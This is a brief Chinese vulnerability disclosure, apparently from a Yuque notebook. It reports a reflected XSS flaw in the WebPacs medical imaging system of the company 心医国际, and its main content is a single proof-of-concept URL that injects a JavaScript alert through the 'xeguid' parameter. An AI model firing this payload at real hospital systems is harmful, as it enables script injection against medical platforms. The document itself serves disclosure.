# 心医国际WebPacs系统存在XSS漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际是中国专业的医疗云应用解决方案提供商，铺建并运营全国领先的智能医疗云平台，依托十年的数据积累和业务实践，持续创新智能医疗场景应用。业务服务覆盖诊疗、教学、科研、管理等多维度，助力政府、医院及产业合作伙伴，打造线上线下高效协同的智慧医疗健康服务体系，目前已建成覆盖全国31个省，联结2万余家医疗机构的智能医疗云平台，助力建设并服务青海、河南、陕西、山西、贵州、新疆、江西、广西、甘肃9大省级远程医疗平台，服务通达80%全国三甲级医院;成功建设并服务全国300余个省、市、县及专科医联体。心心医国际WebPacs系统存在XSS漏洞  
</font>**<font style="color:rgb(38, 38, 38);">二、漏洞复现</font>**

```plain
http://127.0.0.1/WebPacs/webpacs/pacsview?xeguid=%27-alert(123)(1)-%27&view=report
```

![1714378559826-ac84ebc3-5c0e-4735-881c-c5f9982ad68c.png](./img/UqwwuBHtIb6gDHbZ/1714378559826-ac84ebc3-5c0e-4735-881c-c5f9982ad68c-566514.png)





> 更新: 2024-06-17 09:27:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lfhr7qyafn7qabkz>